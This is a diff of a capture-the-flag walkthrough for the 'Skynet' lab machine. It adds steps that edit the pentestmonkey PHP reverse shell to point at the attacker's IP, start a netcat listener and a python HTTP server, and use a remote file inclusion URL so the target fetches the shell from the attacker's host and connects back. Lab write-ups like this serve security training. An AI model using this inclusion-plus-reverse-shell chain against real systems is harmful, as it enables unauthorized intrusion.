@@ -10,12 +10,12 @@
 
 <h1> Enumeration </h1>
 <h3>NMAP</h3>
-<p>First, we start with the CLASSIC nmap scan</p>
 
 ```bash
 nmap -T4 -p- -A [targetIP]
 ```
 *[targetIP] being the IP of Skynet CTF*
+
 <p align="center"> <img src="./images/2.png"></p>
 
 **Open Ports:**<br>
@@ -341,6 +341,64 @@ git clone https://github.com/pentestmonkey/php-reverse-shell.git
 ```
 
 <p>That will download the reverse shell on your local machine.</p>
+
+<p align="center"> <img src="./images/46.png"></p><br>
+
+```cd``` into the *php-reverse-shell* folder and open it using a text editor so we change some things around.<br>
+
+I will be using **mousepad**.<br>
+
+```bash
+mousepad php-reverse-shell.php
+```
+
+<p align="center"> <img src="./images/47.png"></p><br>
+
+Find the **$ip** variable and change that IP address to the IP address of your local machine.<br>
+As for **$port**, you can leave it as is, or if you want to follow my exact walthrough, go ahead and change it to **7123**.<br>
+
+<p>When that is done, save and exit the text editor.</p>
+
+Now, let's open a new terminal instance and use **netcat** to listen to incoming connections on the port we specified (7123).<br>
+
+<h3>NETCAT</h3>
+
+<p align="center"> <img src="./images/48.png"></p><br>
+
+Now that the listener is on, let's set up a simple HTTP server in the same location that our *php-reverse-shell* script is at.<br>
+
+We will do this using ```Python2```.<br>
+
+```bash
+python2 -m SimpleHTTPServer 80
+```
+
+<p>When that is done, you can add out full URL including the reverse shell where [FI] is.</p>
+
+**Full URL:**<br>
+*http://[boxIP]/45kra24zxs28v3yd/administrator/alerts/alertConfigField.php?urlConfig=http://<yourIP>/php-reverse-shell.php*<br>
+
+<p>Once that is done, head over to your netcat listener and let's see if we have a shell.</p>
+
+<p align="center"> <img src="./images/49.png"></p><br>
+
+**We do!**<br>
+
+<p>From here, lets see which user we are.</p>
+
+```bash
+whoami
+```
+
+We are *www-data*<br>
+
+<p>Let's find us that user flag.</p>
+
+```ls``` to see the contents and ```cd``` over to the *home* directory where I suspect that the first flag is at.<br>
+
+When you ```ls``` from the *home directory*, we notice that we can access Miles' folder. ```cd``` into that and you can ```cat``` out the *user.txt* flag.<br>
+
+
 
 
 
